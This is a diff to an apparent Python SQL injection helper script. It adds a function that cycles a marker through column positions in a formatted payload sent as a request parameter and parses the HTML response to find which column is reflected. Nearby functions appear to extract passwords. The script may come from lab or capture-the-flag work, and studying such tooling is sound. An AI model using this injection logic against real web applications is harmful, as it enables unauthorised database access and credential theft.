@@ -1,7 +1,7 @@
 import requests
 from requests.exceptions import HTTPError
 import pickle
-#import cPickle as pickle
+# import cPickle as pickle
 from bs4 import BeautifulSoup
 import re
 import difflib
@@ -95,6 +95,23 @@ def find_param(url: str, list_of_columns: list,
         elif s[0] == '+':
             n += 1
     return key
+
+
+def find_column_position(url: str, list_of_columns: list, payload: str,
+                         p: str, finds: str, cook={}) -> int:
+    for i in range(len(list_of_columns)):
+        tmp = list_of_columns[i]
+        list_of_columns[i] = finds
+        param = {p: payload % (','.join(list_of_columns))}
+        response = get_request(url, param, cook)
+        soup = BeautifulSoup(response, 'html.parser')
+        ret = soup.find(string=re.compile('rows'))
+        if str(len(list_of_columns)) in ret:
+            print(ret, i)
+            return i
+        list_of_columns[i] = tmp
+    print('column position not found')
+    exit(1)
 
 
 def extract_pass(response: str, pass_r: str) -> str:
